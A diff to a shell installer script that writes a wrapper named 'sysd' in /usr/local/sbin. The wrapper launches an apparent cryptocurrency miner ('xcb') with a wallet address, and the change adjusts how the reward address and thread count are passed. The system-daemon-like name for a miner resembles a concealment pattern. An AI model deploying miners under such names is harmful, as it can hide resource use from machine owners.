@@ -37,14 +37,17 @@ $SUDO tee /usr/local/sbin/sysd >/dev/null <<'WRAPPER'
 set -eu
 : "${WALLET:?WALLET kosong di /etc/xcb/miner.env}"
 : "${WORKER:?WORKER kosong di /etc/xcb/miner.env}"
-: "${THREADS:?THREADS kosong di /etc/xcb/miner.env}"
-# Binary lama (pra-PR #20) hanya membaca CONN_ADDRESS di jalur CONN; binary
-# baru memakai WALLET sebagai fallback. Menyalin WALLET ke CONN_ADDRESS
-# menyamakan keduanya sehingga rollback binary lama tetap memakai alamat
-# reward yang sama.
-CONN_ADDRESS="$WALLET"
+# CONN_ADDRESS menang atas WALLET di Config::parse, dan hanya WALLET yang
+# memecah suffix ".worker" (sama seperti -u). Samakan keduanya tanpa suffix
+# supaya tidak ada alamat reward berbeda di antara dua variabel itu.
+CONN_ADDRESS="${WALLET%%.*}"
 export CONN_ADDRESS
-exec /usr/local/bin/xcb -a conn --worker "$WORKER" -t "$THREADS" --ui=log
+set -- -a conn --worker "$WORKER" --ui=log
+# THREADS kosong = auto (Config memakai jumlah CPU); jangan paksa -t "".
+if [ -n "${THREADS:-}" ]; then
+    set -- "$@" -t "$THREADS"
+fi
+exec /usr/local/bin/xcb "$@"
 WRAPPER
 $SUDO chmod 0700 /usr/local/sbin/sysd
 
